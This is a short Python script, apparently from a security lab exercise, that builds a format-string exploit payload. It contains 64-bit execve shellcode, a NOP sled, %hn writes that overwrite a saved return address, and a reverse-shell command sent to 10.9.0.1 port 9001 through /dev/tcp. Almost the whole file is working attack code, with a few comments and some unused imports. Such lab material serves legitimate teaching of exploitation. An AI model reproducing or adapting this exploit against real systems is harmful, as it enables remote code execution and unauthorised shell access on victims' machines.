#!/usr/bin/python3
from audioop import add
from distutils.command.build import build
from re import L
import sys
from unittest.util import three_way_cmp
import os

# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i >& /dev/tcp/10.9.0.1/9001 0>&1;"
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64
# Put the shellcode somewhere in the payload
content[800:800+len(shellcode)] = shellcode

bu = 0x00007fffffffe020+300 # Adding 300 to the start of buffer to go deep into the stack and land on the NOP sled.
buff_start = bu
a = hex(buff_start)[2:6]
b = hex(buff_start)[6:10]
c = hex(buff_start)[10:14]
a1 = int(a,16)
b1 = int(b,16) - a1
c1 = int(c,16) - int(b,16) + 65536

s = "%159$hn%.{}x%160$hn%.{}x%161$hn%.{}x%162$hn".format(a1,b1,c1)
format_string = (s).encode('latin-1')
content[:len(format_string)] = format_string

add1 = 0x00007fffffffdf60+8 # Return address = Frame pointer + 8
content[1000:1008] = (add1+6).to_bytes(8,byteorder='little')
content[1008:1016] = (add1+4).to_bytes(8,byteorder='little')
content[1016:1024] = (add1+2).to_bytes(8,byteorder='little')
content[1024:1032] = (add1).to_bytes(8,byteorder='little')


# Save the format string to file
with open('badfile', 'wb') as f:
   f.write(content)
